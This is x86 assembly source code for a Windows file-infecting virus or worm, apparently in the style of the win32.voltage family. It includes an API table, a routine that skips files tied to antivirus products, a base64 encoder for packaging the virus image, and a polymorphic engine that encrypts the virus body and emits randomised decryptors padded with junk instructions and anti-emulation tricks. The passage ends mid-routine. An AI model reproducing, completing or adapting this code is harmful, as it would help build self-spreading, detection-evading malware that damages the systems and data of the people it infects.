ApiAddressTable:
	
	CreateFile		dd	0
	CloseHandle		dd	0
	CreateFileMapping	dd	0
	MapViewOfFile		dd	0
	UnMapViewOfFile		dd	0
	LoadLibrary		dd	0
	FreeLibrary		dd	0
	GetModuleFileName	dd	0
	SetFileAttributes	dd	0
	GetFileSize		dd	0
	SetFilePointer		dd	0
	SetEndOfFile		dd	0
	GetTickCount		dd	0
	GlobalAlloc		dd	0
	GlobalFree		dd	0
	GetLocalTime		dd	0
	GetFileAttributes	dd	0
	GetFileTime		dd	0
	SetFileTime		dd	0
	CreateMutex		dd	0
	OpenMutex		dd	0
	FindFirstFile		dd	0
	FindNextFile		dd	0
	SetCurrentDirectory	dd	0
	WriteFile		dd	0
	FindClose		dd	0
	MultiByteToWideChar	dd	0
	lstrcat			dd	0
	CreateThread		dd	0
	GetModuleHandle		dd	0
	Sleep			dd	0
	WaitForSingleObject	dd	0
	ExitThread		dd	0
	ExitProcess		dd	0
	GetDriveType		dd	0
	GetFullPathName		dd	0
	WinExec			dd	0
	VirtualProtect		dd	0
	SetUnhandledExceptionFilter	dd	0
	DeleteFileA		dd	0
	GetTempPath		dd	0
	ReadFile		dd	0
	CopyFile		dd	0
	GetWindowsDirectory	dd	0
	
	
IF	DEBUG
	OutputDebugString	dd	0
ENDIF
	
	NumberOfApis		equ	44
	
	dd	0,0


	_GetProcAddress		db	"GetProcAddress",0
	__GetProcAddress	dd	0
	
;ecx - number of apis
;eax - address to api strings
;ebx - address to api address
;edx - module handle
GetNextAPI:
	push	ecx
	push	edx
	push	eax
	push	eax
	push	edx
	call	[ebp + __GetProcAddress]
	or	eax,eax
	je	ApiErr
	mov	dword ptr [ebx],eax
	pop	eax
NextSTR:inc	eax
	cmp	byte ptr [eax],0h
	jne	NextSTR
	inc	eax
	add	ebx,4h
	pop	edx
	pop	ecx
	loop	GetNextAPI
	stc
	ret
ApiErr:	add	esp,0ch
	clc
	ret	
	
;check if file is related to av programs or canot be infected
;input:
;esi - file name
;output:
;carry flag

CheckFileName:
	lea	esi,[ebp + FileToInfect]
	xor	ecx,ecx
@checkV:cmp	byte ptr [esi + ecx],'v'
	je	badfile
	cmp	byte ptr [esi + ecx],'V'
	je	badfile
	cmp	byte ptr [esi + ecx],0h
	je	no_v
	inc	ecx
	jmp	@checkV
no_v:	push	esi			;save file name for later use
	mov	ecx,TwoBytesNames	;scan for 2 bytes bad name
	lea	edi,[ebp + DontInfectTable]
l2:	mov	bx,word ptr [edi]
l2_1:	mov	ax,word ptr [esi]
	cmp	ax,bx
	je	ex_rs
	add	bx,2020h
	cmp	ax,bx
	je	ex_rs
	sub	bx,2020h
	inc	esi
	cmp	byte ptr [esi],0h
	jne	l2_1
	mov	esi,[esp]		;restore file name	
	add	edi,2h
	loop	l2
	mov	ecx,FourBytesNames	;scan for 4 bytes bad name
	lea	edi,[ebp + DontInfectTable + (2*TwoBytesNames)]
	mov	esi,[esp]		;get file name
l3:	mov	ebx,dword ptr [edi]
l3_1:	mov	eax,dword ptr [esi]
	cmp	eax,ebx
	je	ex_rs
	add	ebx,20202020h
	cmp	eax,ebx
	je	ex_rs
	sub	ebx,20202020h
	inc	esi
	cmp	byte ptr [esi],0h
	jne	l3_1
	mov	esi,[esp]
	add	edi,4h
	loop	l3
	pop	esi
	stc
	ret
ex_rs:	pop	esi
badfile:clc
	ret
	
DontInfectTable:

	db	"FP"
	db	"TB"
	db	"AW"
	db	"DR"
	db	"F-"
	TwoBytesNames	equ	5
	db	"INOC"
	db	"PAND"
	db	"ANTI"
	db	"AMON"
	db	"N32S"
	db	"NOD3"
	db	"NPSS"
	db	"SMSS"
	db	"SCAN"
	db	"ZONE"
	db	"PROT"
	db	"MONI"
	db	"RWEB"
	db	"MIRC"
	db	"CKDO"
	db	"TROJ"
	db	"SAFE"
	db	"JEDI"
	db	"TRAY"		
	db	"ANDA"	
	db	"SPID"		
	db	"PLOR"
	db	"NDLL"		
	db	"TREN"
	db	"NSPL"
	db	"NSCH"
	db	"SYST"		;dont infect files in system directory
	db	"ALER"


	FourBytesNames	equ	28	

CreateVirusBase64Image:
	push	0h
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0h
	push	FILE_SHARE_READ
	push	GENERIC_WRITE or GENERIC_READ
	cmp	byte ptr [ebp + use_rar_file],0h
	je	usexe
	lea	eax,[ebp + FileToInfect]
	jmp	__mb64
usexe:	lea	eax,[ebp + MorphedWorm]
__mb64:	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	Base64CreationErr
	mov	[ebp + hvirusfile],eax
	;get file size:
	push	0
	push	[ebp + hvirusfile]
	call	[ebp + GetFileSize]
	cmp	eax,0ffffffffh
	je	CloseFileErr
	mov	[ebp + virusfilesize],eax
	push	eax
	xor	edx,edx
	mov	ecx,3h
	div	ecx
	xchg	ecx,eax
	pop	eax
	add	eax,ecx
	mov	ecx,45
	mul	ecx
	add	eax,400h	;allocate more memory than needed,just for safty
	push	eax
	push	GPTR
	call	[ebp + GlobalAlloc]	;allocate memory
	cmp	eax,0h
	je	CloseFileErr
	mov	[ebp + base64outputmem],eax
	;map file into the memory
	xor	eax,eax
	push	eax
	push	[ebp + virusfilesize]
	add	dword ptr [esp],512d
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hvirusfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	B64FreeMemErr
	mov	[ebp + hvirusmap],eax
	xor	eax,eax
	push	[ebp + virusfilesize]
	add	dword ptr [esp],512d
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hvirusmap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	B64CloseMapErr
	mov	[ebp + hvirusinmem],eax
	xchg	eax,esi
	mov	edi,[ebp + base64outputmem]
	mov	ecx,[ebp + virusfilesize]
	call	Base64
	mov	[ebp + sizeofbase64out],eax
	push	[ebp + hvirusinmem]
	call	[ebp + UnMapViewOfFile]
	push	[ebp + hvirusmap]
	call	[ebp + CloseHandle]
	push	[ebp + hvirusfile]
	call	[ebp + CloseHandle]
	stc
	ret
B64CloseMapErr:
	push	dword ptr [ebp + hvirusmap]
	call	[ebp + CloseHandle]
B64FreeMemErr:
	push	dword ptr [ebp + base64outputmem]
	call	[ebp + GlobalFree]
CloseFileErr:
	push	[ebp + hvirusfile]
	call	[ebp + CloseHandle]
Base64CreationErr:
	clc
	ret	

	hvirusfile	dd	0
	virusfilesize	dd	0
	base64outputmem	dd	0
	sizeofbase64out	dd	0
	hvirusmap	dd	0
	hvirusinmem	dd	0

;Base64 encoder (c) DR-EF - v2.1
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;thats the same base64 encoder that was 
;at win32.voltage with padding support
;input:
;esi - data source
;edi - where to write encoded data
;ecx - size of data to encode
;output:
;eax - size of encoded data
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Base64:	xor	edx,edx	
	push	ecx
	push	ecx
	mov	eax,ecx
	mov	ecx,3h
	div	ecx
	or	edx,edx
	jne	setr
	mov	ecx,edx
	jmp	nori
setr:	sub	ecx,edx
nori:	mov	[esp+4h],ecx
	pop	ecx
	xor	edx,edx
	push	edx
@3Bytes:push	edx
	xor	eax,eax
	xor	ebx,ebx
	or	al,byte ptr [esi]
	shl	eax,8h
	inc	esi
	or	al,byte ptr [esi]
	shl	eax,8h
	inc	esi
	or	al,byte ptr [esi]
	inc	esi
	push	ecx
	mov	ecx,4h
@outbit:mov	ebx,eax
	and	ebx,3fh				;leave only 6 bits
	lea	edx,[ebp + Base64Table]
	mov	bl,byte ptr [ebx + edx]
	mov	byte ptr [edi + ecx - 1h],bl
	shr	eax,6h
	loop	@outbit
	add	edi,4h
	pop	ecx
	pop	edx
	add	edx,4h	
	add	dword ptr [esp],4h
	sub	ecx,3h
	jecxz	ExitB64
	cmp	ecx,0
	jb	ExitB64
	rcl	ecx,1h
	jc	ExitB64
	rcr	ecx,1h
	cmp	edx,4ch				;did we need to add new line ?
	jne	DoLoop
	xor	edx,edx
	mov	word ptr [edi],0a0dh
	add	edi,2h
	add	dword ptr [esp],2h
DoLoop:	or	ecx,ecx
	jne	@3Bytes
ExitB64:pop	eax
	pop	ecx
	jecxz	b64out				;data is aligned by 3,all fine	
	cmp	ecx,1h
	jne	@pad2
	mov	byte ptr [edi-1h],'='
	jmp	b64out
@pad2:	mov	word ptr [edi-2h],'=='
b64out:	ret
	
Base64Table	db	"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"	
	
;Voltage PolyMorphic Engine:
;---------------------------
;encrypt code with 4 bytes key with diffrent way each time
;and create polymorphic decryptor,the polymorphic decryptor
;has diffrent instructions that do the same thing mixed with
;junk code & anti emulation trixs


CreateDecryptor:
	call	InitRandomNumber	;init random number generator
	call	GenRandomNumber
	and	eax,1f40h		;get random numebr between 0 ~ 8000
	cmp	eax,7d0h
	ja	NextM
	mov	byte ptr [ebp + EncryptionMethod],1h ;use not
	jmp	EncryptVirus
NextM:	cmp	eax,0fa0h
	ja	NextM2
	mov	byte ptr [ebp + EncryptionMethod],2h ;use add
	jmp	EncryptVirus
NextM2:	cmp	eax,1770h
	ja	NextM3
	mov	byte ptr [ebp + EncryptionMethod],3h ;use sub
	jmp	EncryptVirus
NextM3:	mov	byte ptr [ebp + EncryptionMethod],4h ;use xor
EncryptVirus:
	call	GenRandomNumber
	mov	dword ptr [ebp + key],eax	;get random key
	xor	eax,eax
	mov	ecx,[ebp + SizeOfDataToEncrypt]		;size of data in words
	mov	edi,[ebp + StartOfDataToEncrypt]
	mov	esi,edi
@enc:	lodsd
	cmp	byte ptr [ebp + EncryptionMethod],1h	;is not	?
	jne	NextE
	not	eax
	jmp	_stosw
NextE:	cmp	byte ptr [ebp + EncryptionMethod],2h	;is add ?
	jne	NextE2
	add	eax,dword ptr [ebp + key]
	jmp	_stosw
NextE2:	cmp	byte ptr [ebp + EncryptionMethod],3h	;is sub	?
	jne	NextE4
	sub	eax,dword ptr [ebp + key]
	jmp	_stosw
NextE4: xor	eax,dword ptr [ebp + key]		;xor
_stosw:	stosd
	loop	@enc
	mov	edi,[ebp + WhereToWriteDecryptor]
	call	WriteJunkCode
	call	WriteInstruction2
	call	WriteJunkCode
	call	WriteInstruction3
	call	WriteJunkCode
	call	WriteInstruction4
	call	WriteJunkCode
	mov	dword ptr [ebp + PolyBuffer],edi	;saved for loop
	call	WriteInstruction5
	call	WriteJunkCode
	call	WriteInstruction6
	call	WriteJunkCode
	call	WriteInstruction7
	call	WriteJunkCode
	call	WriteInstruction8
	call	WriteJunkCode
	call	WriteInstruction9
	call	WriteJunkCode
	ret
	
	EncryptionMethod	db	0	;1=not 2=add 3=sub 4=xor
	key			dd	0
	WhereToWriteDecryptor	dd	0
	StartOfDataToEncrypt	dd	0
	ProgramImageBase	dd	0
	PolyBuffer		dd	0
	SizeOfDataToEncrypt	dd	0	;virus size in dwords
	FixRVA			dd	0

	CustomXDecryptPoint	dd	0
	
	


	

		
WriteInstruction2:
	;this function set esi register to start of encrypted virus
	call	GenRandomNumber
	mov	ebx,[ebp + CustomXDecryptPoint]
	and	eax,0ffh		;get random number between 0 ~ 255
	cmp	eax,33h
	ja	ins2_1
	mov	byte ptr [edi],0beh	;way 1:
	mov	dword ptr [edi + 1],ebx	;mov esi,StartOfDataToEncrypt
	add	edi,5h
	jmp	retins2
ins2_1:	cmp	eax,66h
	ja	ins2_2
	mov	byte ptr [edi],68h	;way 2:
	mov	dword ptr [edi + 1],ebx	;push	StartOfDataToEncrypt
	add	edi,5h
	call	WriteJunkCode		;pop	esi
	mov	byte ptr [edi],5eh
	inc	edi
	jmp	retins2
ins2_2:	cmp	eax,99h
	ja	ins2_3
	mov	word ptr [edi],0f633h	;way 3:
	add	edi,2h			;xor esi,esi
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins2oresival
	jmp	retins2
ins2_3:	cmp	eax,0cch
	ja	ins2_4
	mov	word ptr [edi],0f62bh	;way 4
	add	edi,2h			;sub esi,esi
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins2oresival		
	jmp	retins2
ins2_4:	not	ebx			;way 5
	mov	byte ptr [edi],0beh	;mov esi,not StartOfDataToEncrypt
	mov	dword ptr [edi + 1],ebx	
	add	edi,5h
	call	WriteJunkCode
	mov	word ptr [edi],0d6f7h	;not esi
	add	edi,2h
retins2:ret
_ins2oresival:
	;write or esi,StartOfDataToEncrypt instruction
	mov	word ptr [edi],0ce81h
	mov	dword ptr [edi + 2],ebx
	add	edi,6h
	ret
	
WriteInstruction3:
	;this function set edi register to esi register
	call	GenRandomNumber
	and	eax,0c8h
	cmp	eax,32h
	ja	ins3_1
	mov	word ptr [edi],0fe8bh	;mov edi,esi
	add	edi,2h
	jmp	retins3
ins3_1: cmp	eax,64h
	ja	ins3_2
	mov	byte ptr [edi],56h	;push esi
	inc	edi
	call	WriteJunkCode
	mov	byte ptr [edi],5fh	;pop edi
	inc	edi
	jmp	retins3
ins3_2:	cmp	eax,96h
	ja	ins3_3
	mov	word ptr [edi],0fe87h	;xchg edi esi
	add	edi,2h
	call	WriteJunkCode
	mov	word ptr [edi],0f78bh	;mov esi,edi
	add	edi,2h
	jmp	retins3
ins3_3:	mov	word ptr [edi],0f787h	;xchg edi esi
	add	edi,2h
	call	WriteJunkCode
	mov	word ptr [edi],0f78bh	;mov esi,edi
	add	edi,2h
retins3:ret

WriteInstruction4:
	;this function set ecx with the size of the virus in dwords
	call	GenRandomNumber
	mov	ebx,[ebp + SizeOfDataToEncrypt]
	and	eax,0ffh
	cmp	eax,33h
	ja	ins4_1
	mov	byte ptr [edi],0b9h	;mov ecx,sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins4	
ins4_1:	cmp	eax,66h
	ja	ins4_2
	mov	byte ptr [edi],68h	;push sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	call	WriteJunkCode
	mov	byte ptr [edi],59h	;pop ecx
	inc	edi
	jmp	retins4	
ins4_2:	cmp	eax,99h
	ja	ins4_3
	mov	word ptr [edi],0c933h	;xor ecx,ecx
	add	edi,2h
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins4orecxval
	jmp	retins4	
ins4_3:	cmp	eax,0cch
	ja	ins4_4
	mov	word ptr [edi],0c92bh	;sub ecx,ecx
	add	edi,2h
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins4orecxval
	jmp	retins4
ins4_4: not	ebx
	mov	byte ptr [edi],0b9h	;mov ecx,not sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	call	WriteJunkCode
	mov	word ptr [edi],0d1f7h
	add	edi,2h
retins4:ret
_ins4orecxval:
	mov	word ptr [edi],0c981h
	mov	dword ptr [edi + 2],ebx
	add	edi,6h
	ret
WriteInstruction5:
	;this function read 4 bytes from [esi] into eax
	;and add to esi register 4 (if there is need to do so).
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,64h
	ja	ins5_1
	mov	byte ptr [edi],0adh	;lodsd
	inc	edi
	jmp	retins5
ins5_1:	cmp	eax,0c8h
	ja	ins5_2
	mov	word ptr [edi],068bh	;mov eax,dword ptr [esi]
	add	edi,2h
	call	_ins5addesi4
	jmp	retins5
ins5_2:	mov	word ptr [edi],36ffh	;push dword ptr [esi]
	add	edi,2h
	call	WriteJunkCode
	mov	byte ptr [edi],58h	;pop eax
	inc	edi
	call	_ins5addesi4
retins5:ret

_ins5addesi4:
	;this function write add to esi register 4
	call	GenRandomNumber
	and	eax,64h
	cmp	eax,32h
	ja	addesi4_2
	mov	word ptr [edi],0c683h	;way 1
	mov	byte ptr [edi + 2],4h	;add esi,4h
	add	edi,3h
	jmp	raddesi
addesi4_2:
	mov	ecx,4h		;way 2
@incesi:mov	byte ptr [edi],46h
	inc	edi
	call	WriteJunkCode
	loop	@incesi
raddesi:ret


WriteInstruction6:
	;this function decrypt the value of eax
	mov	ebx,dword ptr [ebp + key]
	cmp	byte ptr [ebp + EncryptionMethod],1h
	jne	ins6_1
	mov	word ptr [edi],0d0f7h	;not eax
	add	edi,2h
	jmp	retins6
ins6_1:	cmp	byte ptr [ebp + EncryptionMethod],2h
	jne	ins6_2
	mov	byte ptr [edi],2dh	;sub eax,key
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins6
ins6_2:	cmp	byte ptr [ebp + EncryptionMethod],3h
	jne	ins6_3
	mov	byte ptr [edi],05h	;add eax,key
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins6
ins6_3:	mov	byte ptr [edi],35h
	mov	dword ptr [edi + 1],ebx ;xor eax,key
	add	edi,5h
	jmp	retins6
retins6:ret




WriteInstruction7:
	;this function copy the value of eax to [edi]
	call	GenRandomNumber
	and	eax,258h
	cmp	eax,0c8h
	ja	ins7_1
	mov	byte ptr [edi],0abh	;stosd
	inc	edi
	jmp	retins7
ins7_1:	cmp	eax,190h
	ja	ins7_2
	mov	word ptr [edi],0789h	;mov dword ptr [edi],eax
	add	edi,2h
	call	WriteJunkCode
	call	addedi4
	jmp	retins7
ins7_2:	mov	byte ptr [edi],50h	;push eax
	inc	edi
	call	WriteJunkCode
	mov	word ptr [edi],078fh	;pop dword ptr [edi]
	add	edi,2h
	call	addedi4
retins7:ret

addedi4:
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,96h
	ja	_addedi4
	mov	word ptr [edi],0c783h
	mov	byte ptr [edi + 2],4h
	add	edi,3h
	jmp	retins7a
_addedi4:
	mov	ecx,4h
@incedi:mov	byte ptr [edi],47h	;inc edi
	inc	edi
	call	WriteJunkCode
	loop	@incedi
retins7a:ret


WriteInstruction8:
	;this function write the loop instruction of the decryptor
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,96h
	ja	ins8_1
	mov	byte ptr [edi],49h	;dec ecx
	inc	edi
	call	WriteJunkCode
	mov	word ptr [edi],0f983h
	mov	byte ptr [edi + 2],0h	;cmp ecx,0h
	add	edi,3h
	mov	eax,dword ptr [ebp + PolyBuffer]
	sub	eax,edi
	mov	byte ptr [edi],75h	;jne
	sub	eax,2h
	mov	byte ptr [edi + 1],al
	add	edi,2h
	jmp	retins8
ins8_1:	mov	eax,dword ptr [ebp + PolyBuffer]
	sub	eax,edi
	mov	byte ptr [edi],0e2h	;loop
	sub	eax,2h
	mov	byte ptr [edi + 1],al
	add	edi,2h
retins8:ret


WriteInstruction9:
	;this istruction write a code in the stack,that jump into virus code
	call	GenRandomNumber
	mov	ebx,[ebp + CustomXDecryptPoint]
	mov	dword ptr [ebp + push_and_ret + 1],ebx	;save address
	;push 'push offset' & 'ret' instructions to the stack
	;way 1:
	;	push xxx
	;	push xxx
	;way 2:
	;	mov	reg,xxx
	;	push	reg
	;	mov	reg,xxx
	;	push	reg
	;way 3:
	;	mov	reg,xored xxx
	;	push	reg
	;	xor	dword ptr [esp],xored val
	;	mov	reg,xored xxx
	;	push	reg
	;	xor	dword ptr [esp],xored val
	;------------------------------------------------------
	and	eax,4b0h
	cmp	eax,190h
	ja	I9_A
	xor	ecx,ecx				;way 1 !!!
	mov	cx,word ptr [ebp + push_and_ret+4]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi + 1h],ecx	;gen push xxx
	add	edi,5h
	call	WriteJunkCode
	xor	ecx,ecx
	mov	ecx,dword ptr [ebp + push_and_ret]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi +1h],ecx		;gen push xxx
	add	edi,5h	
	jmp	I9_Exit
I9_A:	cmp	eax,320h
	ja	I9_B
	xor	eax,eax
	mov	ax,word ptr [ebp + push_and_ret+4]
	call	GenMoveAndPush
	xor	eax,eax
	mov	eax,dword ptr [ebp + push_and_ret]
	call	GenMoveAndPush
	jmp	I9_Exit
I9_B:	call	GenRandomNumber
	xchg	ebx,eax
	xor	eax,eax
	mov	ax,word ptr [ebp + push_and_ret+4]
	xor	eax,ebx
	call	GenMoveAndPush
	call	_WriteJunkCode
	mov	al,81h
	stosb
	mov	ax,2434h
	stosw
	xchg	ebx,eax
	push	eax
	stosd
	xor	eax,eax
	mov	eax,dword ptr [ebp + push_and_ret]
	xor	eax,dword ptr [esp]
	call	GenMoveAndPush
	call	_WriteJunkCode
	pop	ebx
	mov	al,81h
	stosb
	mov	ax,2434h
	stosw
	xchg	ebx,eax
	stosd
I9_Exit:
	Call	WriteJunkCode
	

	call	GenRandomNumber
	
	and	eax,1000h			;get num between 0 ~ 4k
	cmp	eax,400h
	ja	@GJE1

	
	call	GenRandomNumber
	
	push	eax				;save rnd in stack
	
	
	call	GenMovRegEsp

	
	xchg	eax,ecx
	mov	ecx,8h
	div	ecx
	xchg	eax,ecx
	
	mov	eax,[esp]

	call	CGenSubRegNum

	
	sub	cl,0e9h
	add	cl,51h
	xchg	cl,al
	stosb					;gen push reg
	
	;gen add dword ptr [esp],num
		
	mov	al,81h				;gen add
	stosb
	mov	ax,2404h			;dword ptr [esp]
	stosw
	pop	eax				;restore rnd number
	stosd
	mov	al,0c3h				;gen ret
	stosb

	jmp	ExtGJE
@GJE1:	cmp	eax,800h
	ja	@GJE2
		
		
	call	GenMovRegEsp

	xchg	eax,ecx
	mov	ecx,8h
	div	ecx

	add 	al,51h				;gen push reg
	stosb
	
	mov	al,0c3h				;gen ret
	stosb
	
	jmp	ExtGJE
@GJE2:	cmp	eax,0c00h
	ja	@GJE3
	mov	ax,0c354h			;gen push esp & ret
	stosw
	jmp	ExtGJE	
@GJE3:	mov	ax,0e4ffh			;gen jmp esp
	stosw
ExtGJE:	ret


	;instructions to generate in the stack:
	push_and_ret	db	68h,0,0,0,0,0c3h
	
GenXAntiEmulation:

	mov	al,50h
	stosb					;gen push eax
	
	call	_WriteJunkCode
	
	mov	ax,310Fh
	stosw					;gen rdtsc
		
	call	GenRandomNumber
	cmp	al,0a0h				;use rcl or rcr ?
	ja	GnRclx
	
	mov	ax,0d8c1h			;rcr
	jmp	xGnXX
GnRclx: mov	ax,0d0c1h			;rcl
xGnXX:	stosw
	
	call	GenRandomNumber
	stosb
	
	call	GenRandomNumber
	
	cmp	al,0a0h
	ja	GnxJc
	mov	ax,0f973h
	jmp	Xjmp2
GnxJc:	mov	ax,0f972h
Xjmp2:	stosw					;gen jc or jnc to exit procedure code
	
	call	_WriteJunkCode
	
	mov	al,58h				;gen pop eax
	stosb

	ret

			
;input:
;edi - dest
;cl  - reg index(0 ~ 6)
;eax - number ( if custom is used)
GenSubRegNum:
	call	GenRandomNumber
CGenSubRegNum:				;use custom number
	add	cl,0e9h
	cmp	cl,0ech
	jne	@gsrn
	mov	cl,0efh
@gsrn:	push	eax
	mov	ah,cl
	mov	al,81h
	stosw
	pop	eax
	stosd
	ret		
	
	
_WriteJunkCode:		;gen junk code that dont destroy registers
	call	GenRandomNumber
	and	eax,5208h
	cmp	eax,0bb8h
	ja	_WJC1
	call	GenAndReg
	jmp	ExitJC
_WJC1:	cmp	eax,1770h
	ja	_WJC2
	call	GenJump
	jmp	ExitJC
_WJC2:	cmp	eax,2328h
	ja	_WJC3
	call	GenPushPop
	jmp	ExitJC
_WJC3:	cmp	eax,2ee0h
	ja	_WJC4
	call	GenIncDec
	jmp	ExitJC
_WJC4:	cmp	eax,3a98h
	ja	_WJC5
	call	GenMoveRegReg
	jmp	ExitJC
_WJC5:	call	OneByte
ExitJC:	ret

;output cl:reg id
GenMovRegEsp:
	call	GenRandomNumber
	and	eax,00000600h
	mov	ecx,8h
	mul	ecx
	mov	cl,ah
	add	ah,0cch
	mov	al,8bh
	stosw
	ret	

;output ch:reg id
GenEmptyReg:
	call	GenRandomNumber
	xor	ecx,ecx
	and	eax,5208h	
	cmp	eax,0bb8h
	ja	_ER
	mov	ch,0c0h
	jmp	_ER_
_ER:	cmp	eax,1770h
	ja	_ER2
	mov	ch,0dbh
	jmp	_ER_
_ER2:	cmp	eax,2328h
	ja	_ER3
	mov	ch,0c9h
	jmp	_ER_
_ER3:	cmp	eax,2ee0h
	ja	_ER4
	mov	ch,0d2h
	jmp	_ER_
_ER4:	cmp	eax,3a98h
	ja	_ER5
	mov	ch,0ffh
	jmp	_ER_
_ER5:	mov	ch,0f6h
_ER_:	call	GenRandomNumber
	cmp	ah,80h
	ja	_ER__
	mov	cl,33h
	jmp	_E_R
_ER__:	mov	cl,2bh
_E_R:	mov	ax,cx
	stosw	
	ret
	

GenMoveAndPush:
	push	eax				;number to mov & push
No_Esp:	call	GenRandomNumber
	and	al,7h
	mov	cl,al
	add	al,0b8h
	cmp	al,0bch
	je	No_Esp
	stosb
	pop	eax
	stosd
	push	ecx
	call	_WriteJunkCode			;gen junk between the mov and the push
	pop	eax
	add	al,50h
	stosb
	ret
		
InitRandomNumber:
	call	[ebp + GetTickCount]
	xor	eax,[ebp + RandomNumber]
	mov	[ebp + RandomNumber],eax
	ret
	RandomNumber	dd	0
GenRandomNumber:				;a simple random num generator
	pushad
	mov	eax,dword ptr [ebp + RandomNumber]
	and	eax,12345678h
	mov	cl,ah
	ror	eax,cl
	add	eax,98765abdh
	mov	ecx,12345678h
	mul	ecx
	add	eax,edx
	xchg	ah,al
	sub	eax,edx
	mov	dword ptr [ebp + RandomNumber],eax
	popad
	mov	eax,dword ptr [ebp + RandomNumber]
	ret

WriteJunkCode:
	call	GenRandomNumber			;split this procedure
	and	eax,3e8h			;to four procedure's
	cmp	eax,0fah			;in order to give each
	ja	_jnk1				;junkcode the same chance
	call	WriteJunkCode1
	jmp	ExitJunk
_jnk1:	cmp	eax,1f4h
	ja	_jnk2
	call	WriteJunkCode2
	jmp	ExitJunk
_jnk2:	cmp	eax,2eeh
	ja	_jnk3
	call	WriteJunkCode3
	jmp	ExitJunk
_jnk3:	call	WriteJunkCode4
ExitJunk:ret




WriteJunkCode1:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_jnk_1
	call	GenAndReg	;1
	jmp	ExtJunk1
_jnk_1:	cmp	eax,1f4h
	ja	_jnk_2
	call	GenJump		;2
	jmp	ExtJunk1
_jnk_2:	cmp	eax,2eeh
	ja	_jnk_3
	call	GenPushPop	;3
	jmp	ExtJunk1
_jnk_3:	call	GenIncDec	;4
ExtJunk1:ret
	
	
WriteJunkCode2:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_jn_k1
	call	GenMoveRegReg	;5
	jmp	ExtJunk2
_jn_k1:	cmp	eax,1f4h
	ja	_jn_k2
	call	GenAnd		;6
	jmp	ExtJunk2
_jn_k2:	cmp	eax,2eeh
	ja	_jn_k3
	call	GenMove		;7
	jmp	ExtJunk2
_jn_k3:	call	GenPushTrashPopReg	;8
ExtJunk2:ret
	
	
WriteJunkCode3:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_j_nk1
	call	GenShrReg	;9
	jmp	ExtJunk3
_j_nk1:	cmp	eax,1f4h
	ja	_j_nk2
	call	GenShlReg	;10
	jmp	ExtJunk3
_j_nk2:	cmp	eax,2eeh
	ja	_j_nk3
	call	GenRorReg	;11
	jmp	ExtJunk3
_j_nk3:	call	GenRolReg	;12
ExtJunk3:ret
	
	
WriteJunkCode4:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	__jnk1
	call	GenOrReg	;13
	jmp	ExtJunk4
__jnk1:	cmp	eax,1f4h
	ja	__jnk2
	call	GenXorReg	;14
	jmp	ExtJunk4
__jnk2:	cmp	eax,2eeh
	ja	__jnk3
	call	GenSubAddTrash	;15
	jmp	ExtJunk4
__jnk3:	call	GenXAntiEmulation;16
ExtJunk4:ret




GenAndReg:
	;this function generate and reg,reg instruction
	call	GenRandomNumber
	and	eax,1f40h
	cmp	eax,3e8h
	ja	and2
	mov	ah,0c0h
	jmp	exitand
and2:	cmp	eax,7d0h
	ja	and3
	mov	ah,0dbh
	jmp	exitand
and3:	cmp	eax,0bb8h
	ja	and4
	mov	ah,0c9h
	jmp	exitand
and4:	cmp	eax,0fa0h
	ja	and5
	mov	ah,0d2h
	jmp	exitand
and5:	cmp	eax,1388
	ja	and6
	mov	ah,0ffh
	jmp	exitand
and6:	cmp	eax,1770h
	ja	and7
	mov	ah,0f6h
	jmp	exitand
and7:	cmp	eax,1b58h
	ja	and8
	mov	ah,0edh
	jmp	exitand
and8:	mov	ah,0e4h
exitand:mov	al,23h
	stosw
	ret

GenJump:
	;this function generate do nothing condition jump
	call	GenRandomNumber
	and	eax,0fh
	add	eax,70h
	stosw
	ret

GenPushPop:
	;this function generate push reg \ pop reg instruction
	call	GenRandomNumber
	and	eax,7h
	add	eax,50h
	stosb
	add	eax,8h
	stosb
	ret

GenIncDec:
	;this function generate:inc reg\dec reg or dec reg\inc reg instruction
	call	GenRandomNumber
	cmp	al,7fh
	ja	decinc
	and	eax,7h
	add	eax,40h
	stosb
	add	eax,8h
	stosb
	jmp	exitincd
decinc:	and	eax,7h
	add	eax,48h
	mov	byte ptr [edi],al
	stosb
	sub	eax,8h
	mov	byte ptr [edi],al
	stosb
exitincd:ret


GenMoveRegReg:			;gen mov reg,reg
	call	GenRandomNumber
	and	eax,1f40h
	cmp	eax,3e8h
	ja	mreg2
	mov	ah,0c0h
	jmp	exitmreg
mreg2:	cmp	eax,7d0h
	ja	mreg3
	mov	ah,0dbh
	jmp	exitmreg
mreg3:	cmp	eax,0bb8h
	ja	mreg4
	mov	ah,0c9h
	jmp	exitmreg
mreg4:	cmp	eax,0fa0h
	ja	mreg5
	mov	ah,0d2h
	jmp	exitmreg
mreg5:	cmp	eax,1388
